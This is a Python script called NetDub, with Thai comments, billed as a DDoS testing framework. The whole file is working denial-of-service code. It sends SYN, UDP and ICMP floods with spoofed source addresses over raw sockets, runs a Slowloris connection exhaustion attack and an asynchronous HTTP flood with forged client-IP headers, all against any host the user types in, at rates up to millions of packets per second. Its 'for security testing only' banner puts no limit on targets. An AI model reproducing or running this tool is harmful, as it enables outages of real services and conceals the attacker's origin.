#!/usr/bin/env python3
"""
NetDub - Advanced DDoS Testing Framework
สำหรับการทดสอบความปลอดภัยและพัฒนาระบบป้องกัน
ต้องรันในสิทธิ์ root สำหรับประสิทธิภาพสูงสุด
"""

import os
import sys
import socket
import struct
import random
import time
import threading
import multiprocessing
import subprocess
import ctypes
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from scapy.all import *
import requests
import asyncio
import aiohttp
from colorama import Fore, Style, init

# ตรวจสอบสิทธิ์ root
if os.geteuid() != 0:
    print(f"{Fore.RED}[!] ต้องรันในสิทธิ์ root เท่านั้น{Fore.RESET}")
    print(f"{Fore.YELLOW}[*] รันด้วย: sudo python3 {sys.argv[0]}{Fore.RESET}")
    sys.exit(1)

init(autoreset=True)

class NetDubFramework:
    def __init__(self):
        self.target_host = None
        self.target_ip = None
        self.target_port = None
        self.attack_intensity = 1
        self.running = False
        self.stats = {
            'packets_sent': 0,
            'requests_sent': 0,
            'bytes_sent': 0,
            'connections_made': 0,
            'errors': 0
        }
        
        # สร้าง raw socket สำหรับ packet crafting
        try:
            self.raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            self.raw_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except:
            print(f"{Fore.RED}[!] ไม่สามารถสร้าง raw socket ได้{Fore.RESET}")
    
    def banner(self):
        print(f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗
║                           NetDub                             ║
║                Advanced DDoS Testing Framework              ║
║                      Final Edition                          ║
╚══════════════════════════════════════════════════════════════╝{Fore.RESET}

{Fore.YELLOW}⚠️  เพื่อการทดสอบความปลอดภัยและพัฒนาระบบป้องกันเท่านั้น ⚠️{Fore.RESET}
{Fore.RED}🔥 ต้องใช้สิทธิ์ root สำหรับประสิทธิภาพสูงสุด 🔥{Fore.RESET}
""")
    
    def get_target_info(self):
        """รับข้อมูลเป้าหมาย"""
        print(f"{Fore.GREEN}[+] กำหนดเป้าหมาย{Fore.RESET}")
        self.target_host = input(f"{Fore.CYAN}🌐 Host/Domain: {Fore.RESET}").strip()
        self.target_port = int(input(f"{Fore.CYAN}🔌 Port: {Fore.RESET}").strip())
        
        try:
            self.target_ip = socket.gethostbyname(self.target_host)
            print(f"{Fore.GREEN}[✓] Resolved: {self.target_host} -> {self.target_ip}{Fore.RESET}")
        except:
            print(f"{Fore.RED}[!] ไม่สามารถ resolve domain ได้{Fore.RESET}")
            sys.exit(1)
    
    def select_intensity(self):
        """เลือกระดับความแรง"""
        print(f"""
{Fore.YELLOW}[*] เลือกระดับความแรง:{Fore.RESET}
{Fore.GREEN}1. เบาๆ      - 100K pps{Fore.RESET}
{Fore.YELLOW}2. ปานกลาง    - 500K pps{Fore.RESET}
{Fore.MAGENTA}3. แรง       - 1.2M pps{Fore.RESET}
{Fore.RED}4. สุดโหด     - 5M pps{Fore.RESET}
{Fore.RED}5. เป็นไปไม่ได้ - 10.5M pps{Fore.RESET}
        """)
        
        choice = input(f"{Fore.CYAN}🎯 เลือกระดับ (1-5): {Fore.RESET}").strip()
        
        intensity_map = {
            '1': {'name': 'เบาๆ', 'pps': 100000, 'threads': 50, 'processes': 2},
            '2': {'name': 'ปานกลาง', 'pps': 500000, 'threads': 100, 'processes': 4},
            '3': {'name': 'แรง', 'pps': 1200000, 'threads': 200, 'processes': 8},
            '4': {'name': 'สุดโหด', 'pps': 5000000, 'threads': 500, 'processes': 16},
            '5': {'name': 'เป็นไปไม่ได้', 'pps': 10500000, 'threads': 1000, 'processes': 32}
        }
        
        if choice in intensity_map:
            self.attack_config = intensity_map[choice]
            print(f"{Fore.GREEN}[✓] เลือกระดับ: {self.attack_config['name']} - {self.attack_config['pps']:,} pps{Fore.RESET}")
        else:
            print(f"{Fore.RED}[!] ตัวเลือกไม่ถูกต้อง{Fore.RESET}")
            sys.exit(1)
    
    def generate_fake_ip(self):
        """สร้าง fake IP address"""
        return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    
    def create_ip_header(self, src_ip, dst_ip, protocol):
        """สร้าง IP header"""
        version = 4
        ihl = 5
        tos = 0
        tot_len = 0
        ip_id = random.randint(1, 65535)
        frag_off = 0
        ttl = 64
        check = 0
        saddr = socket.inet_aton(src_ip)
        daddr = socket.inet_aton(dst_ip)
        
        ihl_version = (version << 4) + ihl
        header = struct.pack('!BBHHHBBH4s4s', ihl_version, tos, tot_len, ip_id, frag_off, ttl, protocol, check, saddr, daddr)
        return header
    
    def create_tcp_header(self, src_port, dst_port, src_ip, dst_ip):
        """สร้าง TCP header"""
        seq = random.randint(0, 4294967295)
        ack_seq = 0
        doff = 5
        
        # TCP flags
        fin = 0
        syn = 1
        rst = 0
        psh = 0
        ack = 0
        urg = 0
        
        flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
        window = socket.htons(5840)
        check = 0
        urg_ptr = 0
        
        offset_res = (doff << 4) + 0
        tcp_header = struct.pack('!HHLLBBHHH', src_port, dst_port, seq, ack_seq, offset_res, flags, window, check, urg_ptr)
        
        # Pseudo header for checksum
        src_addr = socket.inet_aton(src_ip)
        dst_addr = socket.inet_aton(dst_ip)
        placeholder = 0
        protocol = socket.IPPROTO_TCP
        tcp_length = len(tcp_header)
        
        psh = struct.pack('!4s4sBBH', src_addr, dst_addr, placeholder, protocol, tcp_length)
        psh = psh + tcp_header
        
        tcp_checksum = self.checksum(psh)
        tcp_header = struct.pack('!HHLLBBHHH', src_port, dst_port, seq, ack_seq, offset_res, flags, window, tcp_checksum, urg_ptr)
        
        return tcp_header
    
    def create_udp_header(self, src_port, dst_port, data):
        """สร้าง UDP header"""
        length = 8 + len(data)
        checksum = 0
        header = struct.pack('!HHHH', src_port, dst_port, length, checksum)
        return header
    
    def checksum(self, data):
        """คำนวณ checksum"""
        if len(data) % 2:
            data += b'\x00'
        
        checksum = 0
        for i in range(0, len(data), 2):
            checksum += (data[i] << 8) + data[i + 1]
        
        checksum = (checksum >> 16) + (checksum & 0xFFFF)
        checksum = ~checksum & 0xFFFF
        
        return checksum
    
    def syn_flood(self):
        """SYN Flood Attack - Layer 4"""
        while self.running:
            try:
                src_ip = self.generate_fake_ip()
                src_port = random.randint(1024, 65535)
                
                ip_header = self.create_ip_header(src_ip, self.target_ip, socket.IPPROTO_TCP)
                tcp_header = self.create_tcp_header(src_port, self.target_port, src_ip, self.target_ip)
                
                packet = ip_header + tcp_header
                self.raw_sock.sendto(packet, (self.target_ip, 0))
                
                self.stats['packets_sent'] += 1
                self.stats['bytes_sent'] += len(packet)
                
            except Exception as e:
                self.stats['errors'] += 1
    
    def udp_flood(self):
        """UDP Flood Attack - Layer 4"""
        while self.running:
            try:
                src_ip = self.generate_fake_ip()
                src_port = random.randint(1024, 65535)
                
                # สร้าง random payload
                payload = os.urandom(random.randint(64, 1024))
                
                ip_header = self.create_ip_header(src_ip, self.target_ip, socket.IPPROTO_UDP)
                udp_header = self.create_udp_header(src_port, self.target_port, payload)
                
                packet = ip_header + udp_header + payload
                self.raw_sock.sendto(packet, (self.target_ip, 0))
                
                self.stats['packets_sent'] += 1
                self.stats['bytes_sent'] += len(packet)
                
            except Exception as e:
                self.stats['errors'] += 1
    
    def icmp_flood(self):
        """ICMP Flood Attack - Layer 3"""
        while self.running:
            try:
                src_ip = self.generate_fake_ip()
                
                # สร้าง ICMP packet
                icmp_type = 8  # Echo Request
                icmp_code = 0
                icmp_checksum = 0
                icmp_id = random.randint(1, 65535)
                icmp_seq = random.randint(1, 65535)
                
                payload = os.urandom(56)  # Standard ping size
                
                icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
                icmp_packet = icmp_header + payload
                
                # Calculate checksum
                icmp_checksum = self.checksum(icmp_packet)
                icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
                icmp_packet = icmp_header + payload
                
                ip_header = self.create_ip_header(src_ip, self.target_ip, socket.IPPROTO_ICMP)
                packet = ip_header + icmp_packet
                
                self.raw_sock.sendto(packet, (self.target_ip, 0))
                
                self.stats['packets_sent'] += 1
                self.stats['bytes_sent'] += len(packet)
                
            except Exception as e:
                self.stats['errors'] += 1
    
    async def http_flood(self, session):
        """HTTP Flood Attack - Layer 7"""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101",
        ]
        
        while self.running:
            try:
                url = f"http://{self.target_host}:{self.target_port}/?{random.randint(1, 999999)}"
                
                headers = {
                    'User-Agent': random.choice(user_agents),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                    'Cache-Control': 'max-age=0',
                    'X-Forwarded-For': self.generate_fake_ip(),
                    'X-Real-IP': self.generate_fake_ip(),
                }
                
                async with session.get(url, headers=headers, timeout=5) as response:
                    await response.read()
                    self.stats['requests_sent'] += 1
                    
            except Exception as e:
                self.stats['errors'] += 1
    
    def slowloris_attack(self):
        """Slowloris Attack - Layer 7"""
        sockets = []
        
        # สร้าง initial connections
        for _ in range(200):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((self.target_ip, self.target_port))
                
                sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                sock.send(f"Host: {self.target_host}\r\n".encode())
                sock.send(f"User-Agent: Mozilla/5.0\r\n".encode())
                sock.send("Connection: keep-alive\r\n".encode())
                
                sockets.append(sock)
                self.stats['connections_made'] += 1
                
            except:
                self.stats['errors'] += 1
        
        # ส่ง headers เพื่อ keep alive
        while self.running:
            for sock in sockets[:]:
                try:
                    sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                except:
                    sockets.remove(sock)
                    self.stats['errors'] += 1
            
            time.sleep(10)
    
    def launch_attack(self):
        """เริ่มการโจมตีแบบหลายชั้น"""
        print(f"{Fore.RED}[🔥] เริ่มการโจมตีระดับ: {self.attack_config['name']}{Fore.RESET}")
        print(f"{Fore.YELLOW}[*] Target: {self.target_host}:{self.target_port}{Fore.RESET}")
        print(f"{Fore.YELLOW}[*] Threads: {self.attack_config['threads']}{Fore.RESET}")
        print(f"{Fore.YELLOW}[*] Processes: {self.attack_config['processes']}{Fore.RESET}")
        print(f"{Fore.RED}[*] กด Ctrl+C เพื่อหยุด{Fore.RESET}")
        print()
        
        self.running = True
        
        # เริ่ม Layer 4 attacks
        with ThreadPoolExecutor(max_workers=self.attack_config['threads']) as executor:
            # SYN Flood
            for _ in range(self.attack_config['threads'] // 4):
                executor.submit(self.syn_flood)
            
            # UDP Flood
            for _ in range(self.attack_config['threads'] // 4):
                executor.submit(self.udp_flood)
            
            # ICMP Flood
            for _ in range(self.attack_config['threads'] // 4):
                executor.submit(self.icmp_flood)
            
            # Slowloris
            for _ in range(self.attack_config['threads'] // 4):
                executor.submit(self.slowloris_attack)
        
        # เริ่ม Layer 7 attacks
        asyncio.run(self.async_http_flood())
    
    async def async_http_flood(self):
        """Async HTTP Flood"""
        connector = aiohttp.TCPConnector(limit=1000, limit_per_host=100)
        timeout = aiohttp.ClientTimeout(total=5)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            tasks = []
            for _ in range(500):
                tasks.append(self.http_flood(session))
            
            await asyncio.gather(*tasks, return_exceptions=True)
    
    def monitor_stats(self):
        """แสดงสถิติการโจมตี"""
        start_time = time.time()
        
        while self.running:
            elapsed = time.time() - start_time
            pps = self.stats['packets_sent'] / elapsed if elapsed > 0 else 0
            rps = self.stats['requests_sent'] / elapsed if elapsed > 0 else 0
            
            print(f"\r{Fore.CYAN}[📊] PPS: {pps:,.0f} | RPS: {rps:,.0f} | Packets: {self.stats['packets_sent']:,} | Errors: {self.stats['errors']:,}{Fore.RESET}", end='')
            
            time.sleep(1)
    
    def run(self):
        """รันโปรแกรมหลัก"""
        self.banner()
        self.get_target_info()
        self.select_intensity()
        
        # เริ่ม monitoring
        monitor_thread = threading.Thread(target=self.monitor_stats)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        try:
            self.launch_attack()
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}[!] หยุดการโจมตี{Fore.RESET}")
            self.running = False
        finally:
            self.cleanup()
    
    def cleanup(self):
        """ทำความสะอาด"""
        self.running = False
        if hasattr(self, 'raw_sock'):
            self.raw_sock.close()
        
        print(f"\n{Fore.GREEN}[✓] สถิติสุดท้าย:{Fore.RESET}")
        print(f"  Packets sent: {self.stats['packets_sent']:,}")
        print(f"  Requests sent: {self.stats['requests_sent']:,}")
        print(f"  Bytes sent: {self.stats['bytes_sent']:,}")
        print(f"  Connections made: {self.stats['connections_made']:,}")
        print(f"  Errors: {self.stats['errors']:,}")

if __name__ == "__main__":
    netdub = NetDubFramework()
    netdub.run()
